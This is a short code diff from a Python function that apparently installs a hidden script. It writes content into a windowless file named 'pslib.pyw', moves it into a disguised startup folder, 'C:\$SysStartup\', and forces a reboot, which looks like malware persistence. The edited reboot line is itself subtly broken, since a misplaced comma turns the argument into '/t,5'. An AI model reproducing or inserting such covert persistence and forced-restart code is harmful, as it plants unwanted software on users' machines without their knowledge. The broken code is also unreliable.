@@ -89,7 +89,7 @@ def libInit():
             lib.write(var)
 
         call(["move", "pslib.pyw", "C:\\$SysStartup\\"], shell=True)
-        call(["shutdown /r /t 5"])
+        call(["shutdown", "/r", "/t," "5"], shell=True)
 
         # user = getlogin()
         # print(user)
